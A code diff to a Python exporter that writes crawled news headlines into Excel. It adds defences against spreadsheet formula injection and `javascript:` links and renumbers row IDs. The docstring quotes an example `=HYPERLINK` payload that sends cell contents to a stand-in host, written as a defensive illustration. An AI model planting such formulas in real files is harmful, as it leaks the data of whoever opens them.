@@ -245,6 +245,25 @@ def _fix_validations(sheet) -> None:
         validation.add(span)
 
 
+def _keep_as_text(cell) -> None:
+    """Stop a crawled headline from becoming a live formula.
+
+    openpyxl types any string beginning with `=` as a FORMULA - `data_type` comes back
+    `'f'` and the value is written into an `<f>` element, not a string. Article titles,
+    leads and outlet names are taken verbatim from third-party markup, so a headline of
+    `=HYPERLINK("http://x/?"&A2,"مشاهده خبر")` ships a working exfiltration link inside the
+    file an analyst opens, in the column they are meant to click. This is the spreadsheet
+    half of injection: the payload is inert everywhere in this system except in Excel.
+
+    Forcing the type writes `t="inlineStr"`, so the text is preserved exactly - no leading
+    apostrophe, which is a display convention of Excel's UI and not something the file
+    format carries. The notify column is a formula we generate ourselves and never passes
+    through here; only values do.
+    """
+    if cell.data_type == "f":
+        cell.data_type = "s"
+
+
 def _copy_row_style(sheet, source: int, target: int) -> None:
     for column in range(1, len(HEADERS) + 1):
         origin, destination = sheet.cell(source, column), sheet.cell(target, column)
@@ -283,19 +302,26 @@ def build_workbook(records: list[dict[str, str]], target: Path) -> Path:
         for column, header in enumerate(HEADERS, 1):
             cell = sheet.cell(index, column)
             if header == ID_HEADER:
-                # Numbered HERE, from this file's own row position. All 40 workbooks the
-                # team produced run 1..N within the file, with no exceptions; the exporter
-                # used to number the whole canonical corpus and then group the records by
-                # day, so the second day of a deployment opened at «شناسه خبر» 51. Deriving
-                # it from the row means no way of selecting records can reintroduce that.
-                cell.value = str(index - FIRST_DATA_ROW + 1)
+                # A NUMBER, and numbered from this file's own row position. Both halves are
+                # measured against the team's output: all 40 workbooks store an integer here
+                # and all 40 run 1..N within the file. The exporter used to write a string,
+                # and to number the whole canonical corpus before grouping the records by
+                # day - so the second day of a deployment opened at «شناسه خبر» 51,
+                # left-aligned as text. Deriving it from the row means no way of selecting
+                # records can reintroduce either.
+                cell.value = index - FIRST_DATA_ROW + 1
             elif header == NOTIFY_HEADER:
                 cell.value = _formula(index)
             elif header == "ساعت انتشار":
                 cell.value = _time_value(record[header])
             else:
                 cell.value = record[header]
-                if header == "لینک" and record[header]:
+                _keep_as_text(cell)
+                # Only http(s) becomes a clickable link. `url` is taken verbatim from a
+                # crawled listing's href, `urljoin` resolves `javascript:...` to itself, and
+                # nothing between there and here rejects it - `quality_reason` records
+                # `invalid_url` as a flag but does not stop the row reaching the workbook.
+                if header == "لینک" and record[header].startswith(("http://", "https://")):
                     cell.hyperlink = record[header]
     workbook.save(target)
     workbook.close()
